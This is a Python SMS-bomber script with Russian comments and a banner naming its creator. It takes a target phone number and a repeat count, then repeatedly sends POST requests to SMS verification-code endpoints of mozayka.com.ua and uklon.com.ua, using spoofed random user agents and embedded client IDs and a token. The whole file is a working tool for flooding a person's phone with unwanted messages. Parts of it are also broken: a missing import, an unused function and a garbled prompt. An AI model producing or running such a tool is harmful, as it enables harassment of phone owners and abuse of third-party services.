#Библиотеки
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#Обозначение
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
number = input('[green]Beeante HOMeP tenedona: (бes + ')



run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
for _ in track(range(run)):
 try:
     print('мазайкааа')
     requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
 except:
     print('НЕ отправлено мазайка')
 try:
     print('уклон вход')
     requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": number})
 except:
     print('Не отправельно уклон вход')
 try:
     print('уклон регастратура')
     requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": number})
 except:
     print('Не отправельно уклон регестратура')
